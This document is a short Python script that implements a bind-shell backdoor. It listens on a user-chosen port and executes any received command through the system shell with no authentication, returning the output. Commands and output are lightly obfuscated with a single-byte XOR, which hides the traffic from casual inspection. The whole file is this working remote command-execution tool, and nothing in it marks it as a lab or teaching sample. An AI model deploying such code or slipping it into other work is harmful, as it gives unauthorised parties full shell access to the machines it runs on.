import socket
import subprocess
import threading
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

def start_server(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(5)
    logging.info(f"Listening on {ip}:{port}")

    while True:
        try:
            client, addr = server.accept()
            logging.info(f"Connection from {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client,))
            client_handler.start()
        except Exception as e:
            logging.error(f"Error accepting connection: {e}")

def handle_client(client_socket):
    with client_socket:
        while True:
            try:
                request = client_socket.recv(1024)
                if not request:
                    break
                command = xor_encrypt_decrypt(request.decode(), 16)
                logging.info(f"Received: {command}")
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                response = xor_encrypt_decrypt(output.stdout + output.stderr, 16)
                client_socket.send(response.encode())
            except Exception as e:
                logging.error(f"Error handling client: {e}")
                break

if __name__ == "__main__":
    ip = input("Enter public facing IP address (or leave blank for default): ")
    if not ip:
        ip = '0.0.0.0'  # Default to all interfaces
    port = int(input("Enter port: "))
    start_server(ip, port)
